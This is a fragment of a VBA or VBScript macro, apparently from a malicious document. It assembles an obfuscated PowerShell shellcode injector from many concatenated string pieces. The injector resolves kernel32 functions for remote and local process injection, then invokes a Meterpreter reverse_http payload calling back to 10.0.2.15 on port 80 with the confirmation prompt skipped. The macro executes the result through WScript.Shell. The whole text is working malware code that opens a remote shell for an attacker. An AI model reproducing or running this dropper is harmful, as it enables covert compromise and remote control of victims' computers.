        KTnk = KTnk + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        KTnk = KTnk + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        KTnk = KTnk + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        KTnk = KTnk + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        KTnk = KTnk + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        KTnk = KTnk + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        KTnk = KTnk + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        KTnk = KTnk + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        KTnk = KTnk + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        KTnk = KTnk + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        KTnk = KTnk + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        KTnk = KTnk + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        KTnk = KTnk + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        KTnk = KTnk + "ernel32.dll WriteProcessMemory
        $WriteProce"
        KTnk = KTnk + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        KTnk = KTnk + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        KTnk = KTnk + "()) ([Bool])
        $WriteProcessMemory = [System"
        KTnk = KTnk + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        KTnk = KTnk + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        KTnk = KTnk + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        KTnk = KTnk + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        KTnk = KTnk + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        KTnk = KTnk + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        KTnk = KTnk + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        KTnk = KTnk + "eateRemoteThread = [System.Runtime.InteropServices"
        KTnk = KTnk + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        KTnk = KTnk + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        KTnk = KTnk + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        KTnk = KTnk + " CloseHandle
        $CloseHandleDelegate = Get-De"
        KTnk = KTnk + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        KTnk = KTnk + "le = [System.Runtime.InteropServices.Marshal]::Get"
        KTnk = KTnk + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        KTnk = KTnk + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        KTnk = KTnk + ".ShouldContinue( 'Do you wish to carry out your ev"
        KTnk = KTnk + "il plans?',
                 "Injecting shellcode "
        KTnk = KTnk + "injecting into $((Get-Process -Id $ProcessId).Proc"
        KTnk = KTnk + "essName) ($ProcessId)!" ) )
        {
            "
        KTnk = KTnk + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        KTnk = KTnk + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        KTnk = KTnk + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        KTnk = KTnk + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        KTnk = KTnk + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        KTnk = KTnk + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        KTnk = KTnk + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        KTnk = KTnk + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        KTnk = KTnk + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        KTnk = KTnk + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        KTnk = KTnk + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        KTnk = KTnk + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        KTnk = KTnk + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        KTnk = KTnk + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        KTnk = KTnk + "rocAddress kernel32.dll CreateThread
        $Crea"
        KTnk = KTnk + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        KTnk = KTnk + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        KTnk = KTnk + "IntPtr])
        $CreateThread = [System.Runtime.I"
        KTnk = KTnk + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        KTnk = KTnk + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        KTnk = KTnk + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        KTnk = KTnk + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        KTnk = KTnk + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        KTnk = KTnk + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        KTnk = KTnk + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        KTnk = KTnk + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        KTnk = KTnk + "ForSingleObjectDelegate)
        if ( $Force -or $"
        KTnk = KTnk + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        KTnk = KTnk + " your evil plans?',
                 "Injecting sh"
        KTnk = KTnk + "ellcode into the running PowerShell process!" ) )
"
        KTnk = KTnk + "        {
            Inject-LocalShellcode
      "
        KTnk = KTnk + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        KTnk = KTnk + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        KTnk = KTnk + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(KTnk)
End Function
